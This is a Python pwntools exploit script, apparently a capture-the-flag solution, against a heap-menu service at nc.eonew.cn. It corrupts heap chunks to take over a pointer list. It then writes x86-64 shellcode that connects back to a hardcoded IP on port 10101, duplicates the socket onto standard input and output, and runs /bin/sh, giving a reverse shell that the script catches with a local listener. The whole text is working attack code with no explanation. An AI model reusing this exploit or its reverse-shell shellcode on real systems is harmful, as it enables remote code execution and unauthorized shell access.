from pwn import *

context.arch = 'amd64'

###Util
def create(size,data):
    r.sendlineafter('choice: \n','1')
    r.sendlineafter('size: \n',str(size))
    r.sendafter('Content: \n',data)

def delete(idx):
    r.sendlineafter('choice: \n','2')
    r.sendlineafter('delete: \n',str(idx))

def edit(idx,data):
    r.sendlineafter('choice: \n','3')
    r.sendlineafter('modify: \n',str(idx))
    r.sendafter('Content: \n',data)

def show(idx):
    r.sendlineafter('choice: \n','4')
    r.sendlineafter('see: \n',str(idx))
    return r.recvuntil('\n\n1. add',drop=True)[10:]

###Addr
#  libc2.23/libc2.27 (ran on both library at the same time, upon different output, wrapper kills both process)
list_addr = 0xabc000

###Exploit
r = remote('nc.eonew.cn',10009)
l = listen(10101)

create(0x18,'M30W')     #0
create(0x168,b'\x00'*0xf0+p64(0x100)+p64(0x20))    #1
create(0xf8,'M30W')     #2
delete(1)
edit(0,'a'*0x18)
create(0x88,'M30W')     #1
create(0x68,'M30W')     #3
delete(1)
delete(2)
delete(3)
create(0x71,'M30W')     #1
create(0x28,b'\x00'*0x8+p64(0x71)+p64(list_addr+0x8))   #2
create(0x68,'M30W')     #3
delete(0)
create(0x68,p64(list_addr+0x40)+p64(0x40)+p64(list_addr+0xc8)+p64(0)+p64(0x91))     #0
create(0x18,'M30W')     #4
edit(2,p64(0x21)+b'\x00'*0x18+p64(0x21))
delete(1)
edit(0,p64(0)*5+p64(0x18))
edit(4,p64(0)+p64(0)+p64(list_addr+0x18))

shellcode = asm(f'''
                 push 2
                 pop rdi
                 push 1
                 pop rsi
                 xor rdx,rdx
                 push 41
                 pop rax
                 syscall
                 push rax
                 pop r12

                 push r12
                 pop rdi
                 mov rsi,{list_addr+0x68}
                 push 0x10
                 pop rdx
                 push 42
                 pop rax
                 syscall

                 push r12
                 pop rdi
                 xor rsi,rsi
                 push 33
                 pop rax
                 syscall

                 push r12
                 pop rdi
                 push 1
                 pop rsi
                 push 33
                 pop rax
                 syscall

                 mov rdi,{list_addr+0x78}
                 xor rsi,rsi
                 push rsi
                 pop rdx
                 push 59
                 pop rax
                 syscall
                 ''')
arguments = p16(2)+p16(10101,endian='big')+p32(0x221e708c)+p64(0)+b'/bin/sh\x00'
payload = shellcode.ljust(0x50,b'\x00')+arguments
edit(0,payload)

r.sendlineafter('choice: \n','1')
r.sendlineafter('size: \n','1')

l.wait_for_connection()
l.interactive()
